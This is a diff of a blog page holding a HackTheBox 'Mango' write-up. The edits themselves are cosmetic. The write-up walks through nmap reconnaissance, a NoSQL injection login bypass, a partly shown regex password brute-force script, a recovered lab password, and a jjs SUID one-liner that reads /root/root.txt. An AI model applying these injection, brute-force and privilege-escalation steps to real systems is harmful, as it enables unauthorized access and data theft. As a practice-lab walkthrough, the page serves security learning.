@@ -2,7 +2,7 @@
 <html>
 <head>
 	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Mango Write Up - AJDIN</title><link rel="icon" type="image/png" href=favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Mango Write Up - AJDIN</title><link rel="icon" type="image/png" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta property="og:title" content="HackTheBox Mango Write Up" />
 <meta property="og:description" content="This is a write up on how to gain root on HackTheBox Mango" />
 <meta property="og:type" content="article" />
@@ -59,16 +59,18 @@
 			<h1 class="title">HackTheBox Mango Write Up</h1>
 			<div class="meta">Posted at &mdash; Apr 18, 2020</div>
 		</div>
+		              
 
 		<div class="markdown">
-			<h2 id="reconnaissance">Reconnaissance</h2>
+              		
+<h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let’s run nmap,</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
 </code></pre></div><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
 <p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
 <p><img src="/htb/mango/mango_search_page.png" alt="page"></p>
 <p><img src="/htb/mango/mango_analytics_page.png" alt="page"></p>
-<h2 id="getting-user-account">Getting user account</h2>
+<h2 id="getting-user-account">Getting user account<a class="anchor" href="#getting-user-account">#</a></h2>
 <p>I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference:
 staging-order.mango.htb</p>
 <p><img src="/htb/mango/ssl_certificate.png" alt="ssl"></p>
@@ -76,7 +78,7 @@ staging-order.mango.htb</p>
 <p>We have multiple server running on the same machine and port (Vhost - virtual hosts) so that is why when we change the host value, we access a “different” server.</p>
 <p>Now I added the line to /etc/hosts so the hostname is translated to the correct IP address.</p>
 <p><img src="/htb/mango/etc_hosts.png" alt="hosts"></p>
-<h3 id="nosql-injection">NoSQL injection</h3>
+<h3 id="nosql-injection">NoSQL injection<a class="anchor" href="#nosql-injection">#</a></h3>
 <p>Now we have a login page here, I spent around 4 hours here as this wasn’t something I had experience with. We have to perform an authentication bypass.</p>
 <p><img src="/htb/mango/login_mongodb.png" alt="login"></p>
 <p>The login is handeld by MongoDB in the background. How do I know this? The full nmap scan has recognized a MongoDB instance. MondoDB is a NoSQL database, unlike PostgreSQL, which is an SQL database. We need to perform a NoSQL injection attack.</p>
@@ -91,7 +93,7 @@ staging-order.mango.htb</p>
 </code></pre></div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
 <p><img src="/htb/mango/request_reply.png" alt="reply"></p>
 <p><img src="/htb/mango/after_login.png" alt="afterlogin"></p>
-<h3 id="bruteforcing-the-password">Bruteforcing the password</h3>
+<h3 id="bruteforcing-the-password">Bruteforcing the password<a class="anchor" href="#bruteforcing-the-password">#</a></h3>
 <p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
 <p>You should change the cookie ID.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
@@ -138,15 +140,16 @@ possible_chars <span style="color:#f92672">=</span> list(string<span style="colo
 mango:h3mXK8RhU~f{]f5H
 </code></pre></div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
 <p><img src="/htb/mango/user_txt.png" alt="usertxt"></p>
-<h2 id="getting-root-account">Getting root account</h2>
+<h2 id="getting-root-account">Getting root account<a class="anchor" href="#getting-root-account">#</a></h2>
 <p>First, I switch from sh to bash by running /bin/bash.</p>
 <p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
 <p><img src="/htb/mango/jjs.png" alt="jjs"></p>
-<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS</h3>
+<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS<a class="anchor" href="#privilege-escalation-with-jjs">#</a></h3>
 <p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
 </code></pre></div><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
 <p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
+
 
 		</div>
 
@@ -174,7 +177,7 @@ mango:h3mXK8RhU~f{]f5H
 		</div>
 	<div class="footer wrapper">
 	<nav class="nav">
-		<div> © All rights reserved |  <a href="https://github.com/vividvilla/ezhil">Ezhil theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
+		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
 	</nav>
 </div>
 
